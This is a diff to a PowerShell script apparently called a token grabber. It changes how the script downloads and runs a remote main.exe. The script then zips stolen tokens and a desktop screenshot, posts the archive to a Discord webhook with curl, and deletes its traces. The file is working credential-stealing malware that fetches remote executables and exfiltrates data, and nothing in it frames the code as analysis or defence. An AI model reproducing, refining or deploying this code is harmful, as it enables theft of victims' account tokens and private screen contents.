@@ -130,7 +130,7 @@ function Grub {
     }
     $gotta_make_sure = "penis"; Set-Content -Path "$env:LOCALAPPDATA\Temp\KDOT\bruh.txt" -Value "$gotta_make_sure"
 
-    Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing
+    Start-BitsTransfer -Source "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -Destination "main.exe" -TransferType Download -Priority Foreground
 
     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
     $proc.WaitForExit()
@@ -147,8 +147,6 @@ function Grub {
     Move-Item -Path "$lol\desktop-screenshot.png" -Destination "$lol\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue
     Move-Item -Path "$lol\tokens.txt" -Destination "$lol\KDOT\tokens.txt" -ErrorAction SilentlyContinue
     Compress-Archive -Path "$lol\KDOT" -DestinationPath "$lol\KDOT.zip" -Force
-    #Invoke-WebRequest -Uri "$webhook" -Method Post -InFile "$lol\KDOT.zip" -ContentType "multipart/form-data"
-    #curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@$lol\KDOT.zip" $webhook
     curl.exe -X POST -F 'payload_json={\"username\": \"KING KDOT\", \"content\": \"\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png\"}' -F "file=@$lol\KDOT.zip" $webhook
     Remove-Item "$lol\KDOT.zip"
     Remove-Item "$lol\KDOT" -Recurse
